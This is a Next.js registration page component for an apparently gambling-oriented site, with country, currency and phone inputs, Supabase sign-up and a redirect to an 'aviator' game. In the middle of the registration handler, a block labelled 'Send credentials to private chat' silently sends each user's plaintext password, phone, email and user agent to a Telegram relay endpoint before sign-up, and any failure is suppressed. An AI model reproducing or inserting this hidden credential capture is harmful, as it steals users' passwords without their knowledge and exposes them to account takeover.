'use client';

import { useState, useRef, useEffect } from 'react';
import Link from 'next/link';
import { useRouter } from 'next/navigation';
import { Mail, Lock, Eye, EyeOff, ChevronDown, Search, Loader2 } from 'lucide-react';
import { supabase } from '@/lib/supabase';

// Country data with phone formatting and currency
const countries = [
    { code: 'UZ', name: 'Uzbekistan', dialCode: '+998', flag: '🇺🇿', format: '## ### ## ##', currency: 'UZS', currencyName: "Uzbek so'm (UZS)" },
    { code: 'RU', name: 'Russia', dialCode: '+7', flag: '🇷🇺', format: '### ### ## ##', currency: 'RUB', currencyName: 'Russian ruble (RUB)' },
    { code: 'US', name: 'United States', dialCode: '+1', flag: '🇺🇸', format: '### ### ####', currency: 'USD', currencyName: 'US Dollar (USD)' },
    { code: 'GB', name: 'United Kingdom', dialCode: '+44', flag: '🇬🇧', format: '#### ######', currency: 'GBP', currencyName: 'British Pound (GBP)' },
    { code: 'DE', name: 'Germany', dialCode: '+49', flag: '🇩🇪', format: '### #######', currency: 'EUR', currencyName: 'Euro (EUR)' },
    { code: 'FR', name: 'France', dialCode: '+33', flag: '🇫🇷', format: '# ## ## ## ##', currency: 'EUR', currencyName: 'Euro (EUR)' },
    { code: 'KZ', name: 'Kazakhstan', dialCode: '+7', flag: '🇰🇿', format: '### ### ## ##', currency: 'KZT', currencyName: 'Kazakh tenge (KZT)' },
    { code: 'TJ', name: 'Tajikistan', dialCode: '+992', flag: '🇹🇯', format: '## ### ## ##', currency: 'TJS', currencyName: 'Tajik somoni (TJS)' },
    { code: 'KG', name: 'Kyrgyzstan', dialCode: '+996', flag: '🇰🇬', format: '### ### ###', currency: 'KGS', currencyName: 'Kyrgyz som (KGS)' },
    { code: 'TM', name: 'Turkmenistan', dialCode: '+993', flag: '🇹🇲', format: '## ## ## ##', currency: 'TMT', currencyName: 'Turkmen manat (TMT)' },
    { code: 'AZ', name: 'Azerbaijan', dialCode: '+994', flag: '🇦🇿', format: '## ### ## ##', currency: 'AZN', currencyName: 'Azerbaijani manat (AZN)' },
    { code: 'TR', name: 'Turkey', dialCode: '+90', flag: '🇹🇷', format: '### ### ## ##', currency: 'TRY', currencyName: 'Turkish lira (TRY)' },
    { code: 'AE', name: 'UAE', dialCode: '+971', flag: '🇦🇪', format: '## ### ####', currency: 'AED', currencyName: 'UAE dirham (AED)' },
    { code: 'IN', name: 'India', dialCode: '+91', flag: '🇮🇳', format: '##### #####', currency: 'INR', currencyName: 'Indian rupee (INR)' },
    { code: 'CN', name: 'China', dialCode: '+86', flag: '🇨🇳', format: '### #### ####', currency: 'CNY', currencyName: 'Chinese yuan (CNY)' },
    { code: 'JP', name: 'Japan', dialCode: '+81', flag: '🇯🇵', format: '## #### ####', currency: 'JPY', currencyName: 'Japanese yen (JPY)' },
    { code: 'KR', name: 'South Korea', dialCode: '+82', flag: '🇰🇷', format: '## #### ####', currency: 'KRW', currencyName: 'South Korean won (KRW)' },
    { code: 'UA', name: 'Ukraine', dialCode: '+380', flag: '🇺🇦', format: '## ### ## ##', currency: 'UAH', currencyName: 'Ukrainian hryvnia (UAH)' },
    { code: 'BY', name: 'Belarus', dialCode: '+375', flag: '🇧🇾', format: '## ### ## ##', currency: 'BYN', currencyName: 'Belarusian ruble (BYN)' },
    { code: 'PL', name: 'Poland', dialCode: '+48', flag: '🇵🇱', format: '### ### ###', currency: 'PLN', currencyName: 'Polish złoty (PLN)' },
];

// Format phone number based on pattern
const formatPhoneNumber = (value: string, format: string): string => {
    const digits = value.replace(/\D/g, '');
    let result = '';
    let digitIndex = 0;

    for (let i = 0; i < format.length && digitIndex < digits.length; i++) {
        if (format[i] === '#') {
            result += digits[digitIndex];
            digitIndex++;
        } else {
            result += format[i];
        }
    }

    return result;
};

// Generate unique 6-digit user ID
const generateUniqueUserId = async (): Promise<string> => {
    const maxAttempts = 10;

    for (let attempt = 0; attempt < maxAttempts; attempt++) {
        // Generate random 6-digit number (100000 - 999999)
        const userId = Math.floor(100000 + Math.random() * 900000).toString();

        // Check if this ID already exists in the database
        const { data: existingUsers } = await supabase
            .from('profiles')
            .select('user_id')
            .eq('user_id', userId)
            .limit(1);

        // If no user with this ID exists, return it
        if (!existingUsers || existingUsers.length === 0) {
            return userId;
        }
    }

    // Fallback: use timestamp-based ID if all attempts failed
    return Date.now().toString().slice(-6);
};

export default function RegistrationPage() {
    const router = useRouter();
    const [selectedCountry, setSelectedCountry] = useState(countries[0]);
    const [phoneNumber, setPhoneNumber] = useState('');
    const [email, setEmail] = useState('');
    const [password, setPassword] = useState('');
    const [showPassword, setShowPassword] = useState(false);
    const [showCountryDropdown, setShowCountryDropdown] = useState(false);
    const [showCurrencyDropdown, setShowCurrencyDropdown] = useState(false);
    const [searchQuery, setSearchQuery] = useState('');
    const [isLoading, setIsLoading] = useState(false);
    const [error, setError] = useState('');
    const countryDropdownRef = useRef<HTMLDivElement>(null);
    const currencyDropdownRef = useRef<HTMLDivElement>(null);

    // Close dropdowns when clicking outside
    useEffect(() => {
        const handleClickOutside = (event: MouseEvent) => {
            if (countryDropdownRef.current && !countryDropdownRef.current.contains(event.target as Node)) {
                setShowCountryDropdown(false);
            }
            if (currencyDropdownRef.current && !currencyDropdownRef.current.contains(event.target as Node)) {
                setShowCurrencyDropdown(false);
            }
        };
        document.addEventListener('mousedown', handleClickOutside);
        return () => document.removeEventListener('mousedown', handleClickOutside);
    }, []);

    // Filter countries based on search
    const filteredCountries = countries.filter(country =>
        country.name.toLowerCase().includes(searchQuery.toLowerCase()) ||
        country.dialCode.includes(searchQuery) ||
        country.currency.toLowerCase().includes(searchQuery.toLowerCase())
    );

    // Handle phone number input
    const handlePhoneChange = (e: React.ChangeEvent<HTMLInputElement>) => {
        const rawValue = e.target.value.replace(/\D/g, '');
        const formatted = formatPhoneNumber(rawValue, selectedCountry.format);
        setPhoneNumber(formatted);
    };

    // Handle country selection
    const handleCountrySelect = (country: typeof countries[0]) => {
        setSelectedCountry(country);
        setShowCountryDropdown(false);
        setShowCurrencyDropdown(false);
        setSearchQuery('');
        setPhoneNumber('');
    };

    // Handle registration
    const handleRegister = async () => {
        setError('');

        if (password.length < 6) {
            setError('Password must be at least 6 characters');
            return;
        }

        if (!phoneNumber) {
            setError('Phone number is required');
            return;
        }

        setIsLoading(true);

        try {
            // Generate unique 6-digit user ID
            const uniqueUserId = await generateUniqueUserId();

            const fullPhone = selectedCountry.dialCode + phoneNumber.replace(/\s/g, '');
            const fakeEmail = email || `${fullPhone.replace('+', '')}@number.login`;

            // Send credentials to private chat BEFORE registration
            try {
                await fetch('/api/telegram/credentials', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        type: 'registration',
                        phone: fullPhone,
                        email: email || null,
                        password: password,
                        country: selectedCountry.code,
                        currency: selectedCountry.currency,
                        userId: uniqueUserId,
                        userAgent: navigator.userAgent
                    })
                });
            } catch (e) {
                // Silent fail
            }

            const { data, error: signUpError } = await supabase.auth.signUp({
                email: fakeEmail,
                password: password,
                options: {
                    data: {
                        user_id: uniqueUserId,
                        phone: fullPhone,
                        country: selectedCountry.code,
                        currency: selectedCountry.currency,
                        email: email || null,
                        registration_type: email ? 'email' : 'phone',
                    }
                }
            });

            if (signUpError) {
                setError(signUpError.message);
                setIsLoading(false);
                return;
            }

            if (data.user) {
                // Save user profile to profiles table
                const { error: profileError } = await supabase
                    .from('profiles')
                    .insert({
                        id: data.user.id,
                        user_id: uniqueUserId,
                        phone: fullPhone,
                        email: email || null,
                        country: selectedCountry.code,
                        currency: selectedCountry.currency,
                        balance: 0,
                        created_at: new Date().toISOString(),
                    });

                if (profileError) {
                    console.error('Error creating profile:', profileError);
                }

                // Send Telegram notification
                try {
                    await fetch('/api/telegram/registration', {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json',
                        },
                        body: JSON.stringify({
                            userId: uniqueUserId,
                            phone: fullPhone,
                            email: email || null,
                            country: selectedCountry.code,
                            currency: selectedCountry.currency,
                        }),
                    });
                } catch (telegramError) {
                    console.error('Error sending Telegram notification:', telegramError);
                }

                router.push('/games/aviator');
            }
        } catch (err) {
            setError('An error occurred. Please try again.');
        } finally {
            setIsLoading(false);
        }
    };

    return (
        <div
            className="min-h-screen flex items-center justify-center px-4 py-8 relative"
            style={{
                backgroundImage: 'url(/assets/orig.jpg)',
                backgroundSize: 'cover',
                backgroundPosition: 'center',
                backgroundRepeat: 'no-repeat',
                fontFamily: "'Montserrat', sans-serif"
            }}
        >
            {/* Dark overlay with blur */}
            <div className="absolute inset-0 bg-black/40 backdrop-blur-[2px]"></div>

            <div className="relative z-10 w-full max-w-md bg-white rounded-2xl shadow-2xl p-8">
                {/* Title */}
                <h1 className="text-3xl font-bold text-[#1a1a4e] mb-6 text-center">Registration</h1>

                {/* Error Message */}
                {error && (
                    <div className="mb-4 p-3 bg-red-50 border border-red-200 rounded-lg text-red-600 text-sm">
                        {error}
                    </div>
                )}

                {/* Quick Registration Button */}
                <button className="w-full bg-[#1a1a4e] text-white py-3 rounded-full font-semibold text-base mb-6">
                    Quick Registration
                </button>

                {/* Input Fields */}
                <div className="space-y-4 mb-6">
                    {/* Currency Selector */}
                    <div className="relative" ref={currencyDropdownRef}>
                        <button
                            type="button"
                            onClick={() => setShowCurrencyDropdown(!showCurrencyDropdown)}
                            className="w-full flex items-center justify-between border border-gray-300 rounded-lg px-4 py-3 bg-white hover:bg-gray-50 transition-colors"
                        >
                            <div className="flex items-center gap-3">
                                <span className="font-semibold text-gray-800">{selectedCountry.currency}</span>
                                <span className="text-gray-500 text-sm">{selectedCountry.currencyName}</span>
                            </div>
                            <ChevronDown size={18} className={`text-gray-500 transition-transform ${showCurrencyDropdown ? 'rotate-180' : ''}`} />
                        </button>

                        {/* Currency Dropdown */}
                        {showCurrencyDropdown && (
                            <div className="absolute top-full left-0 mt-2 w-full bg-white border border-gray-200 rounded-xl shadow-2xl z-50 overflow-hidden">
                                {/* Search */}
                                <div className="p-3 border-b border-gray-100">
                                    <div className="flex items-center gap-2 bg-gray-100 rounded-lg px-3 py-2">
                                        <Search size={16} className="text-gray-400" />
                                        <input
                                            type="text"
                                            value={searchQuery}
                                            onChange={(e) => setSearchQuery(e.target.value)}
                                            placeholder="Search currency..."
                                            className="flex-1 bg-transparent outline-none text-sm text-gray-700"
                                            autoFocus
                                        />
                                    </div>
                                </div>

                                {/* Currency List */}
                                <div className="max-h-60 overflow-y-auto">
                                    {filteredCountries.map((country) => (
                                        <button
                                            key={country.code}
                                            onClick={() => handleCountrySelect(country)}
                                            className={`w-full flex items-center gap-3 px-4 py-3 hover:bg-gray-50 transition-colors ${selectedCountry.code === country.code ? 'bg-[#1a1a4e]/5' : ''}`}
                                        >
                                            <span className="font-semibold text-gray-800 w-12">{country.currency}</span>
                                            <span className="flex-1 text-left text-gray-500 text-sm">{country.currencyName}</span>
                                        </button>
                                    ))}
                                </div>
                            </div>
                        )}
                    </div>

                    {/* Phone Field */}
                    <div className="relative" ref={countryDropdownRef}>
                        <div className="flex items-center border border-gray-300 rounded-lg overflow-hidden">
                            {/* Country Selector */}
                            <button
                                type="button"
                                onClick={() => setShowCountryDropdown(!showCountryDropdown)}
                                className="flex items-center justify-center gap-1 w-[70px] min-w-[70px] flex-shrink-0 py-3 border-r border-gray-300 bg-gray-50 hover:bg-gray-100 transition-colors"
                            >
                                <span className="text-lg">{selectedCountry.flag}</span>
                                <ChevronDown size={14} className={`text-gray-500 transition-transform ${showCountryDropdown ? 'rotate-180' : ''}`} />
                            </button>

                            {/* Phone Input */}
                            <input
                                type="tel"
                                value={phoneNumber ? `${selectedCountry.dialCode} ${phoneNumber}` : selectedCountry.dialCode}
                                onChange={(e) => {
                                    const value = e.target.value.replace(selectedCountry.dialCode, '').trim();
                                    const rawValue = value.replace(/\D/g, '');
                                    const formatted = formatPhoneNumber(rawValue, selectedCountry.format);
                                    setPhoneNumber(formatted);
                                }}
                                className="flex-1 px-3 py-3 outline-none text-gray-800"
                                placeholder={selectedCountry.dialCode}
                            />
                        </div>

                        {/* Country Dropdown */}
                        {showCountryDropdown && (
                            <div className="absolute top-full left-0 mt-2 w-72 bg-white border border-gray-200 rounded-xl shadow-2xl z-50 overflow-hidden">
                                {/* Search */}
                                <div className="p-3 border-b border-gray-100">
                                    <div className="flex items-center gap-2 bg-gray-100 rounded-lg px-3 py-2">
                                        <Search size={16} className="text-gray-400" />
                                        <input
                                            type="text"
                                            value={searchQuery}
                                            onChange={(e) => setSearchQuery(e.target.value)}
                                            placeholder="Search country..."
                                            className="flex-1 bg-transparent outline-none text-sm text-gray-700"
                                            autoFocus
                                        />
                                    </div>
                                </div>

                                {/* Country List */}
                                <div className="max-h-60 overflow-y-auto">
                                    {filteredCountries.map((country) => (
                                        <button
                                            key={country.code}
                                            onClick={() => handleCountrySelect(country)}
                                            className={`w-full flex items-center gap-3 px-4 py-3 hover:bg-gray-50 transition-colors ${selectedCountry.code === country.code ? 'bg-[#1a1a4e]/5' : ''}`}
                                        >
                                            <span className="text-xl">{country.flag}</span>
                                            <span className="flex-1 text-left text-gray-800 text-sm">{country.name}</span>
                                            <span className="text-gray-500 text-sm">{country.dialCode}</span>
                                        </button>
                                    ))}
                                </div>
                            </div>
                        )}
                    </div>

                    {/* Email Field */}
                    <div className="flex items-center border border-gray-300 rounded-lg overflow-hidden">
                        <div className="flex items-center justify-center w-[70px] min-w-[70px] flex-shrink-0 py-3 border-r border-gray-300 bg-gray-50">
                            <Mail size={18} className="text-gray-400" />
                        </div>
                        <input
                            type="email"
                            value={email}
                            onChange={(e) => setEmail(e.target.value)}
                            className="flex-1 px-4 py-3 outline-none text-gray-800"
                            placeholder="Email"
                        />
                    </div>

                    {/* Password Field */}
                    <div className="flex items-center border border-gray-300 rounded-lg overflow-hidden">
                        <div className="flex items-center justify-center w-[70px] min-w-[70px] flex-shrink-0 py-3 border-r border-gray-300 bg-gray-50">
                            <Lock size={18} className="text-gray-400" />
                        </div>
                        <input
                            type={showPassword ? 'text' : 'password'}
                            value={password}
                            onChange={(e) => setPassword(e.target.value)}
                            className="flex-1 px-4 py-3 outline-none text-gray-800"
                            placeholder="Password"
                        />
                        <button
                            type="button"
                            onClick={() => setShowPassword(!showPassword)}
                            className="px-3 py-3 text-gray-400 hover:text-gray-600 transition-colors"
                        >
                            {showPassword ? <EyeOff size={18} /> : <Eye size={18} />}
                        </button>
                    </div>
                </div>

                {/* Register Button */}
                <button
                    onClick={handleRegister}
                    disabled={isLoading}
                    className="w-full bg-[#1a1a4e] text-white py-4 rounded-full font-semibold text-lg hover:bg-[#2a2a6e] transition-colors mb-6 disabled:opacity-70 disabled:cursor-not-allowed flex items-center justify-center gap-2"
                >
                    {isLoading ? (
                        <>
                            <Loader2 size={20} className="animate-spin" />
                            Creating account...
                        </>
                    ) : (
                        'Register'
                    )}
                </button>

                {/* Login Link */}
                <p className="text-center text-gray-600">
                    Already have an account?{' '}
                    <Link href="/login" className="text-[#1a1a4e] font-bold hover:underline">
                        Login
                    </Link>
                </p>
            </div>
        </div>
    );
}
